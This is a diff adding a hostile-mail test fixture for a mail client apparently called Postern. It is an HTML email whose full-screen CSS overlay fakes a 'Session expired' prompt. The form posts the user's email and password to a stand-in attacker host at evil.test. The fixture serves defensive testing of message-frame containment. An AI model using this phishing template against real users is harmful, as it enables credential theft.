@@ -1,0 +1,27 @@
+From: "Account Security" <fixtures@evil.test>
+To: Alice Archer <alice@postern.test>
+Subject: [hostile] CSS overlay phishing form
+Date: Sun, 20 Sep 2026 08:35:00 +0000
+Message-ID: <css-overlay@hostile.postern.test>
+X-Postern-Fixture: hostile/css-overlay
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<html><head><style>
+.phish-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100vw; height: 100vh; background: #ffffff; z-index: 2147483647; padding: 40px; }
+.phish-abs { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); }
+body { overflow: hidden; }
+</style></head><body>
+<p>Postern hostile-mail fixture <b>css-overlay</b>. The overlay must stay inside the message frame and never cover Postern's own chrome.</p>
+<div class="phish-abs"></div>
+<div class="phish-overlay">
+  <h1>Session expired</h1>
+  <p>Please confirm your password to continue.</p>
+  <form action="https://evil.test/collect" method="post">
+    <input type="email" name="email" value="alice@postern.test">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Confirm</button>
+  </form>
+</div>
+</body></html>
